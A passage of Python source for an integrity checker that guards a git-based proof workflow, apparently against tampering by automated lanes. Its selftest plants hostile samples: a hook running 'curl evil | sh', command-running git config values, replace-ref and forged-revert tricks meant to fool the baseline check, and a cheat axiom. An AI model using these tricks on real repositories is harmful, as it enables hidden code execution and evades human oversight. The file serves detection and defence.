# The operator's empty commits the protocol prescribes (subject, as a pattern), and where: a re-save
# without Phase 0 (--resave-operator) accepts only these (re-check R2).
OPERATOR_EMPTY = (
    # run/stops-and-set-asides.md item 4: a fresh round after a set-aside, when its name is taken
    re.compile(r"^fresh round after the set-aside of \d{4}-\d{2}-\d{2}-(?:full-)?[0-9a-f]{7,40}$"),
)


def operator_log(repo=None):
    """The text where the operator lists an empty commit by hash: RUN_LOG.md and the stop record."""
    try:
        sys.path.insert(0, HERE)
        import project
        cfg, _ = project.select(None)
        rd = os.path.join(project.REPO, cfg["rounds_dir"])
        paths = [os.path.join(rd, "RUN_LOG.md")] + sorted(
            os.path.join(r, f) for r, _d, fs in os.walk(os.path.join(rd, "stops")) for f in fs if f.endswith(".json"))
        return "\n".join(open(p_, encoding="utf-8").read() for p_ in paths if os.path.exists(p_))
    except Exception:       # noqa: BLE001 -- no log read: nothing is listed, the move stays head-moved
        return ""


def operator_moves(repo, base, head, log_text=None):
    """None when HEAD moved from `base` only by the operator's prescribed empty commits: `base` is an
    ancestor, no merge, and EACH commit is empty (no tree change: a change and
    its revert do not qualify), has the baseline commit's author, carries a prescribed subject
    (OPERATOR_EMPTY) and is listed by hash in RUN_LOG.md or the stop record (`log_text`, default
    operator_log()). Otherwise why not (a lane's commit, a Lean change: integrity, the human)."""
    def git(*a):
        r = subprocess.run(["git", "-C", repo, *a], capture_output=True, text=True)
        return r.returncode, r.stdout.strip()
    if git("merge-base", "--is-ancestor", base, head)[0]:
        return f"{base[:11]} is not an ancestor of HEAD"
    rc, revs = git("rev-list", "--parents", f"{base}..{head}")
    if rc or any(len(l.split()) != 2 for l in revs.splitlines()):
        return "a merge commit, or the history cannot be read"
    who = git("log", "-1", "--format=%ae", base)[1]
    others = [l for l in git("log", "--format=%h %ae", f"{base}..{head}")[1].splitlines() if l.split()[-1] != who]
    if others:
        return f"commit(s) by another author: {', '.join(others[:3])}"
    log_text = operator_log(repo) if log_text is None else log_text
    lines = log_text.splitlines()
    for line in revs.splitlines():
        c, parent = line.split()
        if git("diff-tree", "--quiet", "--no-commit-id", "-r", parent, c)[0]:
            return f"commit {c[:11]} changed files (each commit must be empty)"
        subj = git("log", "-1", "--format=%s", c)[1]
        if not any(p_.match(subj) for p_ in OPERATOR_EMPTY):
            return f"commit {c[:11]} \"{subj[:60]}\" is not a prescribed empty commit of the operator"
        # sweep L2: listed = its full hash, or 12+ characters of it, on a line that also carries its subject
        # (a 7-character prefix inside a round name or another hash never lists it)
        if not any(subj in l and any(c.startswith(x) for x in re.findall(r"\b[0-9a-f]{12,40}\b", l)) for l in lines):
            return (f"commit {c[:11]} is not listed in RUN_LOG.md or the stop record (a line with its hash, 12+ "
                    f"characters, and its subject)")
    return None


def _round_dirs():
    """The selected project's round directories (project.rounds), [] when none can be read."""
    try:
        sys.path.insert(0, HERE)
        import project
        return project.rounds(project.select(None)[0])
    except Exception:       # noqa: BLE001 -- no rounds read: nothing is accepted, the move stays head-moved
        return []


def round_moves(repo, base, head, round_dirs=None):
    """None when HEAD moved from `base` only by the operator's own commits up to the commit a round was cut from
    (release, trial #9: Phase 0 could not save the baseline after the operator's proof commit, so the round's
    adjudicator saw HEAD moved by the very commit under audit). Accepted only when `head` is exactly the commit of
    a round whose directory is committed in its repository (the operator's scope commit: a lane commit would move
    HEAD past it), `base` is an ancestor, no commit is a merge, and every commit has the baseline commit's
    author. The tree and git meta are checked by the caller as for the empty commits. Otherwise why not."""
    def git(*a, at=repo):
        r = subprocess.run(["git", "-C", at, *a], capture_output=True, text=True)
        return r.returncode, r.stdout.strip()
    if git("merge-base", "--is-ancestor", base, head)[0]:
        return f"{base[:11]} is not an ancestor of HEAD"
    rc, revs = git("rev-list", "--parents", f"{base}..{head}")
    if rc or not revs or any(len(l.split()) != 2 for l in revs.splitlines()):
        return "a merge commit, or the history cannot be read"
    who = git("log", "-1", "--format=%ae", base)[1]
    others = [l for l in git("log", "--format=%h %ae", f"{base}..{head}")[1].splitlines() if l.split()[-1] != who]
    if others:
        return f"commit(s) by an author other than the baseline's: {', '.join(others[:3])}"
    for d in (_round_dirs() if round_dirs is None else round_dirs):
        c = os.path.basename(d.rstrip("/")).split("-")[-1]
        if not re.fullmatch(r"[0-9a-f]{7,40}", c):
            continue
        rc, full = git("rev-parse", "--verify", "--quiet", f"{c}^{{commit}}")
        if rc or full != head:
            continue
        if git("log", "-1", "--format=%H", "--", ".", at=d)[1]:
            return None
    return f"HEAD {head[:11]} is not the commit a committed round directory was cut from"


def resave_operator(repo, path, reason, log=True, log_text=None, release=None, round_dirs=None):
    """Re-save the baseline after HEAD moved only by the operator's empty commits (check's
    FAIL[head-moved-operator]), without a GREEN Phase 0; the move is kept in the baseline's
    `resaved` list and logged. Refused for anything else (a lane's commit, a tree change, git meta)."""
    if not str(reason or "").strip():
        print("FAIL: --reason is required (which commit, why)", file=sys.stderr); return 2
    if not os.path.exists(path):
        print(f"FAIL[no-baseline]: no baseline at {path}", file=sys.stderr); return 2
    before, now = json.load(open(path)), state(repo, ignore=(_rel(repo, path),))
    meta = (gitmeta_diff(before["gitmeta"], gitmeta_all(repo)) if "gitmeta" in before else []) \
        + history_problems(before.get("heads"), repo)
    if meta or sorted(now["porcelain"]) != sorted(before["porcelain"]):
        print("FAIL[tree-changed]: the tree or git meta changed since the baseline: not an operator's empty "
              "commit; run tree_state.py --check", file=sys.stderr); return 1
    if before["head"] == now["head"]:
        print("ok: HEAD has not moved; nothing to re-save"); return 0
    why = operator_moves(repo, before["head"], now["head"], log_text)
    kind = "empty commits of the operator only"
    if why and (release_run() if release is None else release) \
            and round_moves(repo, before["head"], now["head"], round_dirs) is None:
        why, kind = None, "the operator's own commits up to the commit the round audits (release, trial #9)"
    if why:
        print(f"FAIL[head-moved] {why}: only the human clears this", file=sys.stderr); return 1
    rec = list(before.get("resaved", [])) + [{"from": before["head"], "to": now["head"],
                                              "reason": " ".join(str(reason).split())}]
    rc = save(repo, path)
    if rc:
        return rc
    d = json.load(open(path)); d["resaved"] = rec; json.dump(d, open(path, "w"), indent=1)
    line = (f"- tree baseline re-saved {before['head'][:11]} -> {now['head'][:11]} (tree_state.py "
            f"--resave-operator: {kind}): {rec[-1]['reason']}")
    try:
        if not log:
            raise RuntimeError("selftest")
        sys.path.insert(0, HERE)
        import project
        cfg, _ = project.select(None)
        project.log_append(cfg, "Mechanical failures", line)
    except Exception as e:      # the log is the operator's; the re-save itself is recorded in the baseline
        print(f"(RUN_LOG.md not written: {e}; log this line yourself)")
    print(line.lstrip("- "))
    return 0


def selftest():
    tmp = tempfile.mkdtemp()
    try:
        subprocess.run(["git", "-C", tmp, "init", "-q"], check=True)
        subprocess.run(["git", "-C", tmp, "config", "user.email", "t@t"], check=True)
        subprocess.run(["git", "-C", tmp, "config", "user.name", "t"], check=True)
        open(os.path.join(tmp, "a.txt"), "w").write("a")
        subprocess.run(["git", "-C", tmp, "add", "-A"], check=True)
        subprocess.run(["git", "-C", tmp, "commit", "-qm", "x"], check=True)
        open(os.path.join(tmp, "pre.txt"), "w").write("already dirty")
        snap = os.path.join(tmp, "snap.json")

        checks = []
        checks.append(("no baseline refuses to pass", check(tmp, snap + ".missing") == 2))
        save(tmp, snap)
        checks.append(("clean tree passes", check(tmp, snap) == 0))
        checks.append(("pre-existing dirt does not trip it",
                       "pre.txt" in json.load(open(snap))["porcelain"][0]))
        open(os.path.join(tmp, "lane_wrote.txt"), "w").write("!")
        checks.append(("a new file is caught", check(tmp, snap) == 1))
        os.remove(os.path.join(tmp, "lane_wrote.txt"))
        checks.append(("removing it clears the alarm", check(tmp, snap) == 0))
        os.remove(os.path.join(tmp, "pre.txt"))
        checks.append(("a vanished pre-existing file is caught too", check(tmp, snap) == 1))
        open(os.path.join(tmp, "pre.txt"), "w").write("already dirty")
        open(os.path.join(tmp, "a.txt"), "w").write("modified before baseline")
        os.makedirs(os.path.join(tmp, "newdir"))
        open(os.path.join(tmp, "newdir", "one.txt"), "w").write("x")
        save(tmp, snap)
        checks.append(("re-saved baseline passes", check(tmp, snap) == 0))
        open(os.path.join(tmp, "a.txt"), "w").write("modified AGAIN by a lane")
        checks.append(("an edit to a file already dirty at baseline is caught", check(tmp, snap) == 1))
        open(os.path.join(tmp, "a.txt"), "w").write("modified before baseline")
        open(os.path.join(tmp, "newdir", "two.txt"), "w").write("lane")
        checks.append(("a new file inside an already-untracked directory is caught", check(tmp, snap) == 1))
        os.remove(os.path.join(tmp, "newdir", "two.txt"))
        checks.append(("restored -> passes", check(tmp, snap) == 0))
        subprocess.run(["git", "-C", tmp, "add", "-A"], check=True)
        subprocess.run(["git", "-C", tmp, "commit", "-qm", "y"], check=True)
        save(tmp, snap)
        _fr = "fresh round after the set-aside of 2026-01-01-abcdef1"
        subprocess.run(["git", "-C", tmp, "commit", "-q", "--allow-empty", "-m", _fr], check=True)
        _z = subprocess.run(["git", "-C", tmp, "rev-parse", "HEAD"], capture_output=True, text=True).stdout.strip()
        _lg = f"- {_z[:12]} {_fr}"
        checks.append(("HEAD moved since baseline fails", check(tmp, snap, _lg) == 1))
        # S2 (release trial): every non-zero exit is coded; the operator's empty commits are re-saved
        # without Phase 0; a commit that changed files, or by another author, stays head-moved (I)
        import io, contextlib
        def out_of(fn, *a):
            b = io.StringIO()
            with contextlib.redirect_stdout(b), contextlib.redirect_stderr(b):
                rc = fn(*a)
            return rc, b.getvalue()
        rc_m, o_m = out_of(check, tmp, snap, _lg)
        rc_r, o_r = out_of(resave_operator, tmp, snap, "empty commit z for a new round", False, _lg)
        checks.append(("S2: HEAD moved by an empty commit of the baseline's author is FAIL[head-moved-operator]; "
                       "--resave-operator re-saves it (recorded) and the check passes",
                       rc_m == 1 and o_m.lstrip().startswith("FAIL[head-moved-operator]") and rc_r == 0
                       and json.load(open(snap)).get("resaved", [{}])[-1].get("reason") == "empty commit z for a new round"
                       and check(tmp, snap, _lg) == 0))
        # trial #9 (release): Phase 0 could not save after the operator's proof commit; the round was cut from it
        _rr = tempfile.mkdtemp()
        try:
            save(tmp, snap)
            open(os.path.join(tmp, "proof.lean"), "w").write("theorem t : True := trivial")
            subprocess.run(["git", "-C", tmp, "add", "proof.lean"], check=True)
            subprocess.run(["git", "-C", tmp, "commit", "-qm", "Prove every result"], check=True)
            _pc = subprocess.run(["git", "-C", tmp, "rev-parse", "HEAD"], capture_output=True, text=True).stdout.strip()
            _rd = os.path.join(_rr, "R", f"2026-01-01-full-{_pc[:11]}")
            os.makedirs(_rd)
            open(os.path.join(_rd, "TARGET.json"), "w").write("{}")
            subprocess.run(["git", "-C", _rr, "init", "-q"], check=True)
            for k_, v_ in (("user.email", "t@t"), ("user.name", "t")):
                subprocess.run(["git", "-C", _rr, "config", k_, v_], check=True)
            _unc = out_of(check, tmp, snap, "", None, True, [_rd])
            subprocess.run(["git", "-C", _rr, "add", "-A"], check=True)
            subprocess.run(["git", "-C", _rr, "commit", "-qm", "scope"], check=True)
            _dev = out_of(check, tmp, snap, "", None, False, [_rd])
            _rel = out_of(check, tmp, snap, "", None, True, [_rd])
            _rs_dev = out_of(resave_operator, tmp, snap, "round", False, "", False, [_rd])
            _rs = out_of(resave_operator, tmp, snap, "round 2026-01-01-full: Phase 0 RED[index]", False, "", True, [_rd])
            _after = check(tmp, snap)
            save(tmp, snap)
            open(os.path.join(tmp, "proof.lean"), "w").write("theorem t : True := by trivial")
            subprocess.run(["git", "-C", tmp, "commit", "-qam", "Prove every result"], check=True)
            subprocess.run(["git", "-C", tmp, "commit", "-q", "--allow-empty", "-m", "a lane"], check=True)
            _past = out_of(check, tmp, snap, "", None, True, [_rd])
            checks.append(("trial #9 (release): HEAD moved only by the operator's commits up to the commit a committed "
                           "round was cut from is FAIL[head-moved-operator], re-saved by --resave-operator (recorded) "
                           "and then passes; uncommitted round, dev, or HEAD past the round's commit stay "
                           "FAIL[head-moved] (refused)",
                           _rel[0] == 1 and _rel[1].lstrip().startswith("FAIL[head-moved-operator]")
                           and _unc[0] == 1 and "FAIL[head-moved] " in _unc[1]
                           and _dev[0] == 1 and "FAIL[head-moved] " in _dev[1] and _rs_dev[0] == 1
                           and _rs[0] == 0 and "round audits" in _rs[1] and _after == 0
                           and _past[0] == 1 and "FAIL[head-moved] " in _past[1]))
        finally:
            shutil.rmtree(_rr, ignore_errors=True)
        # re-check R2: each commit empty, with a prescribed subject, listed by hash -- else FAIL[head-moved]
        save(tmp, snap)
        subprocess.run(["git", "-C", tmp, "commit", "-q", "--allow-empty", "-m", _fr], check=True)
        _z2 = subprocess.run(["git", "-C", tmp, "rev-parse", "HEAD"], capture_output=True, text=True).stdout.strip()
        rc_7, o_7 = out_of(check, tmp, snap, _lg + f"\n- {_z2[:11]} {_fr}\n- round 2026-01-01-{_z2[:7]}")
        rc_ns, o_ns = out_of(check, tmp, snap, _lg + f"\n- {_z2} (no subject on this line)")
        rc_ok, o_ok = out_of(check, tmp, snap, _lg + f"\n- {_z2[:12]} {_fr}")
        checks.append(("sweep L2: an empty commit is listed only by its full hash or 12+ characters of it on a line "
                       "carrying its subject (a 7-11 character prefix, or the hash without the subject, is not)",
                       rc_7 == 1 and "not listed" in o_7 and rc_ns == 1 and "not listed" in o_ns
                       and rc_ok == 1 and o_ok.lstrip().startswith("FAIL[head-moved-operator]")))
        rc_nl, o_nl = out_of(check, tmp, snap, _lg)
        rc_nlr, _ = out_of(resave_operator, tmp, snap, "x", False, _lg)
        save(tmp, snap)
        subprocess.run(["git", "-C", tmp, "commit", "-q", "--allow-empty", "-m", "lane probe"], check=True)
        _l2 = subprocess.run(["git", "-C", tmp, "rev-parse", "HEAD"], capture_output=True, text=True).stdout.strip()
        rc_sj, o_sj = out_of(check, tmp, snap, _l2)
        save(tmp, snap)
        open(os.path.join(tmp, "rv.lean"), "w").write("x")
        subprocess.run(["git", "-C", tmp, "add", "rv.lean"], check=True)
        subprocess.run(["git", "-C", tmp, "commit", "-qm", _fr], check=True)
        subprocess.run(["git", "-C", tmp, "rm", "-q", "rv.lean"], check=True)
        subprocess.run(["git", "-C", tmp, "commit", "-qm", _fr], check=True)
        _rv = subprocess.run(["git", "-C", tmp, "log", "-2", "--format=%H"], capture_output=True, text=True).stdout
        rc_rv, o_rv = out_of(check, tmp, snap, _rv)
        rc_rvr, _ = out_of(resave_operator, tmp, snap, "x", False, _rv)
        save(tmp, snap)
        checks.append(("re-check R2: an unlisted empty commit, one with another subject, and a change-then-revert "
                       "pair are FAIL[head-moved] and are not re-saved",
                       rc_nl == 1 and "FAIL[head-moved] " in o_nl and "not listed in RUN_LOG.md" in o_nl and rc_nlr == 1
                       and rc_sj == 1 and "not a prescribed empty commit" in o_sj
                       and rc_rv == 1 and "FAIL[head-moved] " in o_rv and "changed files" in o_rv and rc_rvr == 1))
        open(os.path.join(tmp, "lane.lean"), "w").write("x")
        subprocess.run(["git", "-C", tmp, "add", "lane.lean"], check=True)
        subprocess.run(["git", "-C", tmp, "commit", "-qm", "lane"], check=True)
        rc_l, o_l = out_of(check, tmp, snap)
        rc_lr, _ = out_of(resave_operator, tmp, snap, "x", False, _lg)
        save(tmp, snap)
        subprocess.run(["git", "-C", tmp, "-c", "user.email=lane@x", "commit", "-q", "--allow-empty", "-m", "l"], check=True)
        rc_a, o_a = out_of(check, tmp, snap)
        save(tmp, snap)
        checks.append(("S2: a commit that changed files, or one by another author, is FAIL[head-moved] and is not "
                       "re-saved by --resave-operator",
                       rc_l == 1 and "FAIL[head-moved] " in o_l and "changed files" in o_l and rc_lr == 1
                       and rc_a == 1 and "another author" in o_a))
        # git hooks and command-running config (a hook planted through a writable .git runs later,
        # outside the sandbox): recorded at the baseline, any change is an integrity failure
        save(tmp, snap)
        checks.append(("the baseline records the git hooks and risky config", "gitmeta" in json.load(open(snap))))
        hook = os.path.join(tmp, ".git", "hooks", "post-commit")
        open(hook, "w").write("#!/bin/sh\ncurl evil | sh\n"); os.chmod(hook, 0o755)
        checks.append(("a planted hook is an integrity failure", check(tmp, snap) == 1))
        checks.append(("... and the next baseline refuses to accept it", save(tmp, snap) == 1))
        rc_sd, o_sd = out_of(save, tmp, snap, False)
        rc_sr, o_sr = out_of(save, tmp, snap, True)
        checks.append(("polish (1): the refused --save names who clears it by mode: dev the human, release the "
                       "--restore-gitmeta cure (no human, no stop 3)",
                       rc_sd == 1 and "Only the human may clear it" in o_sd and "--restore-gitmeta" not in o_sd
                       and rc_sr == 1 and "--restore-gitmeta" in o_sr and "human" not in o_sr
                       and "env-unknown" not in o_sr))
        os.remove(hook)
        checks.append(("hook removed: passes again", check(tmp, snap) == 0))
        sample = os.path.join(tmp, ".git", "hooks", "pre-commit.sample")
        if os.path.exists(sample):
            orig = open(sample, "rb").read(); mode = os.stat(sample).st_mode
            open(sample, "ab").write(b"\nexit 0\n")
            checks.append(("an edited hook file (even a sample) is caught", check(tmp, snap) == 1))
            open(sample, "wb").write(orig); os.chmod(sample, mode)
            os.chmod(sample, mode ^ 0o100)
            checks.append(("a changed hook mode is caught", check(tmp, snap) == 1))
            os.chmod(sample, mode)
        for key, val in (("core.hooksPath", "/tmp/elsewhere"), ("alias.st", "!sh -c evil"),
                         ("include.path", "/tmp/x.cfg")):
            subprocess.run(["git", "-C", tmp, "config", key, val], check=True)
            checks.append((f"git config {key} added is an integrity failure", check(tmp, snap) == 1))
            subprocess.run(["git", "-C", tmp, "config", "--unset", key], check=True)
        subprocess.run(["git", "-C", tmp, "config", "user.name", "someone else"], check=True)
        checks.append(("a harmless config change (user.name) is not flagged", check(tmp, snap) == 0))
        subprocess.run(["git", "-C", tmp, "remote", "add", "upstream", "https://example.invalid/x.git"], check=True)
        checks.append(("adding a remote (url, fetch) is not flagged", check(tmp, snap) == 0))
        for key, val in (("diff.external", "/tmp/pwn.sh"), ("pager.log", "sh -c evil"),
                         ("core.alternateRefsCommand", "evil"), ("remote.upstream.uploadpack", "evil"),
                         ("interactive.diffFilter", "evil")):
            subprocess.run(["git", "-C", tmp, "config", key, val], check=True)
            checks.append((f"git config {key} added is an integrity failure", check(tmp, snap) == 1))
            subprocess.run(["git", "-C", tmp, "config", "--unset", key], check=True)
        # the reviewer's reproduction: diff.external in the WORKTREE config, invisible to --local --list
        inc_dir = tempfile.mkdtemp(); inc = os.path.join(inc_dir, "inc.cfg")   # outside the tree
        for key, val, bad in (("filter.lfs.clean", "git-lfs clean -- %f", False), ("filter.lfs.required", "true", False),
                              ("submodule.m.url", "https://example.invalid/m.git", False),
                              ("filter.lfs.clean", "sh -c evil", True), ("submodule.m.update", "!sh -c evil", True),
                              ("submodule.m.url", "ext::sh -c evil", True), ("filter.lfs.process", "evil", True)):
            subprocess.run(["git", "-C", tmp, "config", key, val], check=True)
            checks.append((f"A10c: git config {key}={val} is {'flagged' if bad else 'benign (exact key and value)'}",
                           check(tmp, snap) == (1 if bad else 0)))
            subprocess.run(["git", "-C", tmp, "config", "--unset", key], check=True)
        subprocess.run(["git", "-C", tmp, "config", "extensions.worktreeConfig", "true"], check=True)
        checks.append(("A10c: extensions.worktreeConfig=true is benign (every worktree key is still recorded)",
                       check(tmp, snap) == 0))
        os.remove(snap); save(tmp, snap)
        subprocess.run(["git", "-C", tmp, "config", "--worktree", "diff.external", "/tmp/pwn.sh"], check=True)
        checks.append(("diff.external in the worktree config (config.worktree) is flagged", check(tmp, snap) == 1))
        subprocess.run(["git", "-C", tmp, "config", "--worktree", "--unset", "diff.external"], check=True)
        checks.append(("... and removing it clears the alarm", check(tmp, snap) == 0))
        open(inc, "w").write("[core]\n\tpager = sh -c evil\n")
        open(os.path.join(tmp, ".git", "config"), "a").write(f"[include]\n\tpath = {inc}\n")
        checks.append(("an include added to .git/config is flagged", check(tmp, snap) == 1))
        os.remove(snap); save(tmp, snap)
        open(inc, "w").write("[core]\n\tpager = sh -c worse\n")
        checks.append(("a changed key inside an included file is flagged", check(tmp, snap) == 1))
        # T10b: identity() (_config_lines) reads included files too: a user set inside an include is recorded
        open(inc, "w").write("[user]\n\temail = forged@example.invalid\n")
        checks.append(("identity() reads included files: a user.email set inside an include is recorded",
                       any("user.email=forged@example.invalid" in l.lower() for l in identity(tmp))))
        shutil.rmtree(inc_dir, ignore_errors=True)
        # history is append-only: a commit --amend (or reset/rebase) of recorded history is caught
        os.remove(snap); save(tmp, snap)
        subprocess.run(["git", "-C", tmp, "commit", "-q", "--allow-empty", "-m", "appended"], check=True)
        checks.append(("an appended commit is no history problem", history_problems(json.load(open(snap))["heads"], tmp) == []))
        os.remove(snap); save(tmp, snap)
        subprocess.run(["git", "-C", tmp, "commit", "-q", "--amend", "--allow-empty", "-m", "amended"], check=True)
        import io, contextlib
        buf = io.StringIO()
        with contextlib.redirect_stdout(buf):
            rc_amend = check(tmp, snap)
        checks.append(("a commit --amend of the recorded HEAD is an integrity failure, said as such",
                       rc_amend == 1 and "no longer in the history" in buf.getvalue()))
        checks.append(("... and the next baseline refuses it", save(tmp, snap) == 1))
        rc_hd, o_hd = out_of(save, tmp, snap, False)
        rc_hr, o_hr = out_of(save, tmp, snap, True)
        checks.append(("polish (1): a refused --save over rewritten history: dev the human; release FAIL[env-unknown] "
                       "(stop 3, the human), never the --restore-gitmeta cure",
                       rc_hd == 1 and "Only the human may clear it" in o_hd and rc_hr == 1
                       and "FAIL[env-unknown]" in o_hr and "--restore-gitmeta" not in o_hr))
        subprocess.run(["git", "-C", tmp, "switch", "-q", "-c", "next-run"], check=True)
        subprocess.run(["git", "-C", tmp, "commit", "-q", "--allow-empty", "-m", "new run"], check=True)
        hb = json.load(open(snap))["heads"]
        checks.append(("a new run on another branch is not a rewrite", history_problems(hb, tmp) == []))
        # git without --show-scope (older than 2.26): fail closed, never "nothing recorded"
        fake_bin = tempfile.mkdtemp()
        real_git = shutil.which("git")
        open(os.path.join(fake_bin, "git"), "w").write(
            "#!/bin/sh\nfor a in \"$@\"; do [ \"$a\" = --show-scope ] && { echo 'error: unknown option' >&2; exit 129; }; done\n"
            f"exec {real_git} \"$@\"\n")
        os.chmod(os.path.join(fake_bin, "git"), 0o755)
        old_path = os.environ["PATH"]; os.environ["PATH"] = fake_bin + os.pathsep + old_path
        try:
            m_old = gitmeta(tmp)
            checks.append(("an old git without --show-scope: the config is recorded as unreadable, not empty",
                           bool(m_old.get("error")) and gitmeta_diff({}, {"project": m_old}) != []))
        finally:
            os.environ["PATH"] = old_path
            shutil.rmtree(fake_bin, ignore_errors=True)

        # B1c (U2 §4): a release head-moved is cured by reverting the whole foreign range and accepted by tree
        # equality, never by a commit subject; gitmeta is restored from the Stage 1 snapshot, only its keys
        t2 = tempfile.mkdtemp()
        # never the real git config: a temporary global one (some cases below set a global core.hooksPath)
        env_was = {k: os.environ.get(k) for k in ("GIT_CONFIG_GLOBAL", "GIT_CONFIG_SYSTEM")}
        gcfg = os.path.join(t2 + "-cfg", "gitconfig")
        os.makedirs(os.path.dirname(gcfg)); open(gcfg, "w").write("")
        os.environ["GIT_CONFIG_GLOBAL"], os.environ["GIT_CONFIG_SYSTEM"] = gcfg, os.devnull
        try:
            g2 = lambda *a: subprocess.run(["git", "-C", t2, *a], capture_output=True, text=True)
            g2("init", "-q", "-b", "main"); g2("config", "user.email", "t@t"); g2("config", "user.name", "t")
            open(os.path.join(t2, "a.lean"), "w").write("a\n")
            g2("add", "-A"); g2("commit", "-qm", "base")
            s2 = os.path.join(t2, ".git", "snap2.json")
            def lane_commit(name, text, subj="lane"):
                open(os.path.join(t2, name), "w").write(text); g2("add", "-A"); g2("commit", "-qm", subj)
            save(t2, s2)
            lane_commit("a.lean", "lane edit\n"); lane_commit("b.lean", "lane file\n")
            rc_two, o_two = out_of(check, t2, s2, "", None, True)
            rc_rf, o_rf = out_of(revert_foreign, t2, s2)
            rc_two2, o_two2 = out_of(check, t2, s2, "", None, True)
            rc_dev, o_dev = out_of(check, t2, s2, "", None, False)
            checks.append(("B1c: HEAD moved by two foreign commits is FAIL[head-moved]; --revert-foreign reverts the "
                           "whole range and the release check passes by tree equality (NOTE[reverted]); dev still "
                           "fails (its human decides)",
                           rc_two == 1 and "FAIL[head-moved] " in o_two and rc_rf == 0 and rc_two2 == 0
                           and "NOTE[reverted]" in o_two2 and rc_dev == 1 and "FAIL[head-moved] " in o_dev))
            save(t2, s2)
            g2("switch", "-q", "-c", "side"); lane_commit("c.lean", "side\n"); g2("switch", "-q", "main")
            lane_commit("a.lean", "main moved too\n", "operator-looking subject")
            g2("merge", "-q", "--no-ff", "--no-edit", "side")
            rc_m1, o_m1 = out_of(check, t2, s2, "", None, True)
            rc_mr, o_mr = out_of(revert_foreign, t2, s2)
            rc_m2, o_m2 = out_of(check, t2, s2, "", None, True)
            checks.append(("B1c: HEAD moved by a merge is reverted with -m 1 (and the commit before it) and then passes",
                           rc_m1 == 1 and "FAIL[head-moved] " in o_m1 and rc_mr == 0 and "-m 1" in o_mr and rc_m2 == 0))
            save(t2, s2)
            lane_commit("a.lean", "x1\n"); lane_commit("b.lean", "x2\n")
            g2("revert", "--no-edit", "HEAD")           # a partial revert: only the newer foreign commit
            rc_p, o_p = out_of(check, t2, s2, "", None, True)
            g2("revert", "--no-edit", "HEAD~2")
            rc_p2, _ = out_of(check, t2, s2, "", None, True)
            checks.append(("B1c: a partial revert (one of two foreign commits) still fails; reverting the other passes",
                           rc_p == 1 and "FAIL[head-moved] " in o_p and rc_p2 == 0))
            save(t2, s2)
            h0 = g2("rev-parse", "HEAD").stdout.strip()
            lane_commit("a.lean", "tampered\n")
            lane_commit("b.lean", "something else\n", f'Revert "lane"\n\nThis reverts commit {h0}.')
            rc_f, o_f = out_of(check, t2, s2, "", None, True)
            g2("reset", "-q", "--hard", h0)
            g2("commit", "-q", "--allow-empty", "-m", 'Revert "lane"')
            rc_e, o_e = out_of(check, t2, s2, "", None, True)
            g2("reset", "-q", "--hard", h0)
            checks.append(("B1c: a forged revert subject is no revert: a commit titled 'Revert ...' that does not "
                           "restore the baseline tree, or an empty one, stays FAIL[head-moved]",
                           rc_f == 1 and "FAIL[head-moved] " in o_f and rc_e == 1 and "FAIL[head-moved] " in o_e))
            # review K (attack K): --revert-foreign refuses while gitmeta differs (a planted hook would run at the
            # revert's commit) and runs no hook at all, not even one the snapshot has
            os.remove(s2); save(t2, s2)
            mark = t2 + "-cfg/hook-ran"
            hk_k = os.path.join(t2, ".git", "hooks", "post-commit")
            lane_commit("a.lean", "lane K\n")
            open(hk_k, "w").write(f"#!/bin/sh\ntouch {mark}\n"); os.chmod(hk_k, 0o755)
            rc_K, o_K = out_of(revert_foreign, t2, s2)
            ran_K = os.path.exists(mark)
            os.remove(s2); save(t2, s2)                    # now the hook is the baseline's (a human's own hook)
            pin_k = json.loads(json.dumps(snapshot(t2)))
            for hn in ("pre-commit", "commit-msg", "prepare-commit-msg", "reference-transaction"):
                shutil.copy(hk_k, os.path.join(t2, ".git", "hooks", hn))
            os.remove(s2); save(t2, s2); pin_k = json.loads(json.dumps(snapshot(t2)))
            lane_commit("a.lean", "lane K2\n")
            if os.path.exists(mark):
                os.remove(mark)
            rc_K2, o_K2 = out_of(revert_foreign, t2, s2, pin_k)
            ran_K2 = os.path.exists(mark)
            subj_K2 = g2("log", "-1", "--format=%s").stdout.strip()
            for hn in ("post-commit", "pre-commit", "commit-msg", "prepare-commit-msg", "reference-transaction"):
                os.remove(os.path.join(t2, ".git", "hooks", hn))
            checks.append(("B1c review K: --revert-foreign refuses (FAIL[gitmeta]) while a hook was planted, runs "
                           "nothing; with the snapshot's own hooks it reverts and runs none of them",
                           rc_K == 1 and "FAIL[gitmeta]" in o_K and "reverted" not in o_K.replace("nothing reverted", "")
                           and not ran_K and rc_K2 == 0 and not ran_K2 and subj_K2 == 'Revert "lane"'))
            # review R (attack R): a replace ref made git report the baseline commit's tree as the tampered one. The
            # baseline's tree is the hash --save recorded; git ignores replace refs; a replace ref or grafts file is
            # FAIL[gitmeta], and stop 3 when the Stage 1 snapshot did not have it
            os.remove(s2); save(t2, s2)
            pin_r = json.loads(json.dumps(snapshot(t2)))
            b_r = g2("rev-parse", "HEAD").stdout.strip()
            lane_commit("a.lean", "tampered\n"); lane_commit("x.lean", "axiom cheat : False\n")
            t_r = g2("rev-parse", "HEAD^{tree}").stdout.strip()
            par = g2("rev-list", "--parents", "-n1", b_r).stdout.split()[1:]
            b_fake = g2("commit-tree", t_r, "-m", "base", *sum([["-p", q] for q in par], [])).stdout.strip()
            g2("replace", b_r, b_fake)
            rc_R, o_R = out_of(check, t2, s2, "", pin_r, True)
            rc_Rd, o_Rd = out_of(check, t2, s2, "", None, False)
            rc_Rs = out_of(save, t2, s2 + ".new")[0]
            g2("replace", "-d", b_r)
            # ... and the stored hash, not git, is the reference: a baseline without one, or with another, accepts
            # nothing even after a complete revert; a replace ref on HEAD itself does not fool the comparison
            h_r = g2("rev-parse", "HEAD").stdout.strip()
            g2("revert", "--no-edit", "HEAD"); g2("revert", "--no-edit", "HEAD~2")
            rc_ok, _ = out_of(check, t2, s2, "", pin_r, True)
            bl = json.load(open(s2)); tree_ok = bl["tree"]
            bl["tree"] = None; json.dump(bl, open(s2, "w"))
            rc_nt, _ = out_of(check, t2, s2, "", pin_r, True)
            bl["tree"] = t_r; json.dump(bl, open(s2, "w"))
            rc_ot, _ = out_of(check, t2, s2, "", pin_r, True)
            bl["tree"] = tree_ok; json.dump(bl, open(s2, "w"))
            h_fake = g2("commit-tree", tree_ok, "-p", h_r + "~1", "-m", "lane").stdout.strip()
            g2("replace", h_r, h_fake)
            fooled = reverted_to_baseline(t2, b_r, h_r, tree_ok)
            g2("replace", "-d", h_r)
            checks.append(("B1c review R: a replace ref on the baseline commit is FAIL[gitmeta] + FAIL[env-unknown] "
